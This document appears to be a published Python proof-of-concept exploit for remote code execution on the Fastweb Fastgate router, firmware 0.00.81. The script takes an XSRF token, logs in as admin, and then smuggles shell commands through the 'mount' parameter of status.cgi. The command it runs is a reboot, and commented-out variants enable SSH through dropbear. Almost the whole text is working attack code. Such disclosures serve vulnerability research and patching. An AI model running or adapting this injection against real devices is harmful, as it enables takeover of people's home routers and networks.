# Exploit Title: Fastweb Fastgate 0.00.81 - Remote Code Execution
# Date: 2019-11-13
# Exploit Author: Riccardo Gasparini
# Vendor Homepage: https://www.fastweb.it/
# Software Link: http://59.0.121.191:8080/ACS-server/file/0.00.81_FW_200_Askey (only from Fastweb ISP network)
# Version: 0.00.81
# Tested on: Linux
# CVE : N/A

import requests, json, time, sys

current_milli_time = lambda: int(round(time.time() * 1000))

password='XXXXXXXXXXXXXXX'

if password == 'XXXXXXXXXXXXXXX':
    print("Password is set to XXXXXXXXXXXXXXX\nOpen the script and change the password")
    sys.exit(-1)

#get XSRF-TOKEN
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36',
    'Referer': 'http://192.168.1.254/tr069',
}
params = ()
response = requests.get('http://192.168.1.254', headers=headers)

#login request and get sessionKey
xsrfToken=response.cookies['XSRF-TOKEN']
cookies = {
    'XSRF-TOKEN': xsrfToken,
}
headers = {
    'Pragma': 'no-cache',
    'X-XSRF-TOKEN': xsrfToken,
    'Accept-Language': 'en-US,en-GB;q=0.9,en;q=0.8,it-IT;q=0.7,it;q=0.6,es;q=0.5,de;q=0.4',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Referer': 'http://192.168.1.254/tr069',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
}
params = (
    ('_', str(current_milli_time())),
    ('cmd', '3'),
    ('nvget', 'login_confirm'),
    ('password', password),
    ('remember_me', '1'),
    ('sessionKey', 'NULL'),
    ('username', 'admin'),
)

response = requests.get('http://192.168.1.254/status.cgi', headers=headers, params=params, cookies=cookies)

jsonResponse = json.loads(response.text)
sessionKey=jsonResponse["login_confirm"]["check_session"]

print("Executing command reboot\n")

#some commands as example are shown below in the mount parameter
params = (
    ('_', str(current_milli_time())),
    ('act','nvset'),
    ('service','usb_remove'),
    #Code execution
    #('mount','&ping -c 10 192.168.1.172&'),
    #('mount','&dropbear -r /etc/dropbear/dropbear_rsa_host_key&'),#to enable SSH
    ('mount','&reboot&'),
    ('sessionKey', sessionKey),
)
response = requests.get('http://192.168.1.254/status.cgi', headers=headers, params=params, cookies=cookies)
print(response.text)

#logout
params = (
    ('_', str(current_milli_time())),
    ('cmd', '5'),
    ('nvget', 'login_confirm'),
    ('sessionKey', sessionKey),
)

response = requests.get('http://192.168.1.254/status.cgi', headers=headers, params=params, cookies=cookies)
print(json.dumps(json.loads(response.text), indent=2))